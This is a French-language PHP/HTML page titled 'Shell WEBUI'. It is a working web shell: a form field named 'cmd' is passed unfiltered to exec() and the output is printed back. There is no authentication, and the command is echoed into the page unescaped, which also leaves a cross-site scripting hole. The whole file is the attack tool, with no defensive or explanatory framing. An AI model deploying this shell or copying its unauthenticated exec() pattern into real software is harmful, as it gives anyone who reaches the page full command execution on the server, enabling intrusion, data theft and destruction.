<!doctype html>
<html lang='fr'>

    <head>

        <!-- Required meta tags -->
        <meta charset='utf-8'>
        <meta name='viewport' content='width=device-width, initial-scale=1, shrink-to-fit=no'>
        <meta name='description' content='Shell webui'>
        <meta name='keywords' content='HTML,CSS, PHP'>
        <meta name='author' content='Shell webui'>

        <!-- Bootstrap CSS -->
        <link rel='stylesheet' href='https://stackpath.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css' integrity='sha384-WskhaSGFgHYWDcbwN70/dfYBj47jz9qbsMId/iRN3ewGhXQFZCSftd1LZCfmhktB' crossorigin='anonymous'>

        <!-- My css -->
        <link rel='stylesheet' href='style.css'>

        <title>Shell WEBUI</title>

    </head>

    <body>

        <content class='container' role='main'>


            <br/>

            <div class='row'>
                <div class='col-xs-2 col-sm-2 col-md-3 col-lg-3'></div>

                <div class='col-xs-8 col-sm-8 col-md-6 col-lg-6 panel'>

                    <legend>Shell : </legend>

                    <form id='test' method='GET' action='index.php'>
                        <div class='form-group'>
                            <label for='motif'>Commande : </label>
                            <input type='text' class="form-control myInput" id='cmd' name='cmd' placeholder="ls/cat/grep/locate..." required>
                        </div>
                        <div class='form-row'>
                            <div class='col'>
                                <button type='submit' class="btn" hidden>Chercher</button>
                            </div>
                        </div>
                    </form>


                </div>

                <div class='col-xs-2 col-sm-2 col-md-3 col-lg-3'></div>

            </div>


            <br/>

                    


                    <?php 
						if(isset($_GET['cmd'])){
							$cmd =$_GET['cmd'];
							
							echo "
							<div class='row '>
                            <div class='col-xs-2 col-sm-2 col-md-3 col-lg-3'></div>

                            <div class='col-xs-8 col-sm-8 col-md-6 col-lg-6 panel'>

                                <legend>Résultat : '". $cmd ."' </legend>
							                       
							";
							
							
							exec($cmd, $out);
							foreach ($out as $clef => $val ){
								echo $clef . " : " . $val ."<br/>" ;
							}	
						}
						
						echo "</div>";
					?>

                

                <div class='col-xs-2 col-sm-2 col-md-3 col-lg-3'></div>

            </div>
        </content>

        <!-- jQuery first, then Popper.js, then Bootstrap JS -->
        <script src='https://code.jquery.com/jquery-3.3.1.slim.min.js' integrity='sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo' crossorigin='anonymous'></script>
        <script src='https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js' integrity='sha384-ZMP7rVo3mIykV+2+9J3UJ46jBk0WLaUAdn689aCwoqbBJiSnjAK/l8WvCWPIPm49' crossorigin='anonymous'></script>
        <script src='https://stackpath.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js' integrity='sha384-smHYKdLADwkXOn1EmN1qk/HfnUcbVRZyYmZ4qpPea6sjB/pTJ0euyQp0Mk8ck+5T' crossorigin='anonymous'></script>
        
    </body>

</html>
